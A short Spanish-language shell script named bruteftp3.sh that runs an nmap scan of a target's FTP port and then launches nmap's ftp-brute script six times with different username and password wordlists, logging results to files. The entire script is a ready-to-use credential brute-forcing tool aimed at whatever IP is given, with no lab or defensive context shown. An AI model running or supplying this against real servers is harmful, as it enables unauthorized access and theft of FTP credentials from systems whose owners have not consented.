#!/bin/sh
cat << "INFO"
	
 brute
  ______ _______ _____  
 |  ____|__   __|  __ \ 
 | |__     | |  | |__) |
 |  __|    | |  |  ___/ 
 | |       | |  | |     
 |_|       |_|  |_| v1.0 - (R) 2025 http://www.hackingyseguridad.com/     
           
INFO
if [ -z "$1" ]; then
        echo
        echo "Fuerza bruta con diccionarios a FTP."
        echo "Requiere nmap"
        echo "Uso.: sh bruteftp3.sh <ip>"
        echo
        exit 0
fi
echo
echo
nmap -Pn $1 $2 -sS -sVC --script auth -p 21 -O
echo "..."
nmap -Pn $1 $2 -p 21 --script ftp-brute --script-args userdb=usuarios0.txt,passdb=claves0.txt,unpwdb.timelimit=0 -oN resultado.txt
nmap -Pn $1 $2 -p 21 --script ftp-brute --script-args userdb=usuarios0.txt,passdb=claves.txt,unpwdb.timelimit=0 -oN resultado1.txt
nmap -Pn $1 $2 -p 21 --script ftp-brute --script-args userdb=usuarios0.txt,passdb=claves2.txt,unpwdb.timelimit=0 -oN resultado2.txt
nmap -Pn $1 $2 -p 21 --script ftp-brute --script-args userdb=usuarios.txt,passdb=claves0.txt,unpwdb.timelimit=0 -oN resultado3.txt
nmap -Pn $1 $2 -p 21 --script ftp-brute --script-args userdb=usuarios.txt,passdb=claves.txt,unpwdb.timelimit=0 -oN resultado4.txt
nmap -Pn $1 $2 -p 21 --script ftp-brute --script-args userdb=usuarios.txt,passdb=claves2.txt,unpwdb.timelimit=0 -oN resultado5.txt

